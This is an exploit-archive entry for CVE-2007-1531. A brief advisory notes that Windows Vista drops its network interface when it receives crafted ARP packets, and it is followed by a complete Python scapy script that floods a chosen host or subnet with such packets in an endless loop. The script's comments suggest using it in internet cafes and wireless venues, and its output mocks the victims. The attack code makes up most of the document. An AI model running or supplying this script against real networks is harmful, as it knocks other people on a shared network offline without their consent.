source: http://www.securityfocus.com/bid/23266/info

Microsoft Windows Vista is prone to a denial-of-service vulnerability.

Remote attackers may exploit this issue by submitting malicious ARP requests to the vulnerable computer. To exploit this issue, attackers must have access to the local network segment of a target computer.

Remote attackers can exploit this issue to cause the network interface to stop responding, denying further service to legitimate users.

#!/usr/bin/env python
#
# :: Kristian Hermansen ::
# Date: 20070514
# Reference: CVE-2007-1531
# Description: Microsoft Windows Vista (SP0) dumps interfaces when
# it receives this ARP packet.  This DoS is useful for an internet
# cafe, wireless venue, or legitimate local attack.  The victim will
# need to manually refresh their network interface.  OK, sure
# it's a dumb local attack, but why does Vista disable iface!?!??
# -> Thanks to Newsham / Hoagland
# Vulnerable: Microsoft Windows Vista (SP0) [All Versions]
# Tested:
# * victim == Windows Vista Enterprise (SP0) [English]
# * attacker == Ubuntu Feisty (7.04)
# Usage: python fISTArp.py <victim>
# Depends: scapy.py
# [?] If you don't have scapy
# [+] wget http://hg.secdev.org/scapy/raw-file/tip/scapy.py

from sys import argv
from os import geteuid
from scapy import Ether,ARP,send,srp,conf
from time import sleep

conf.verb = 0

def head():
    print """
                       __ ___ ____ _____  _               
                      / _|_ _/ ___|_   _|/ \   _ __ _ __  
                     | |_ | |\___ \ | | / _ \ | '__| '_ \ 
                     |  _|| | ___) || |/ ___ \| |  | |_) |
                     |_| |___|____/ |_/_/   \_\_|  | .__/ 
                                                   |_|    

    """

def isroot():
    if geteuid() != 0:
        print "TRY AGAIN AS ROOT SILLY..."
        return False
    else:
        return True

def usage():
    print "usage:", argv[0], "<victim(s)>"
    print "examples:", argv[0], "192.168.1.100"
    print "examples:", argv[0], "192.168.1.0/24\n"

def fisting():
    arp_fist = ARP(pdst=argv[1],op=2)
    print "We are going to loop forever, CTRL-C to stop...\n"
    while True:
        sleep(3)
        for a in arp_fist:
            arping = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=a.pdst)
            ans,unans = srp(arping,timeout=0.1)
            if len(ans) == 1:
                a.psrc=a.pdst
                print a.pdst, "is ALIVE!"
                print "* Time to shut it down!"
                send(a)
                ans2,unans2 = srp(arping,timeout=0.1)
                if len(unans2) == 1:
                    print "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
                    print "@@@", a.psrc, "was rubber fisted!"
                    print "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
                    sleep(3)
                else:
                    print "FAILED:", a.pdst, "is still alive :-("
            else:
                print a.pdst, "is already DEAD!"
            print

head()
if isroot() != True:
    exit(1)
if len(argv) != 2:
    usage()
    exit(1)
else:
    fisting()

# u.b.u.n.t.u n.e.t.s.n.i.p.e.r t.h.c.t.e.st.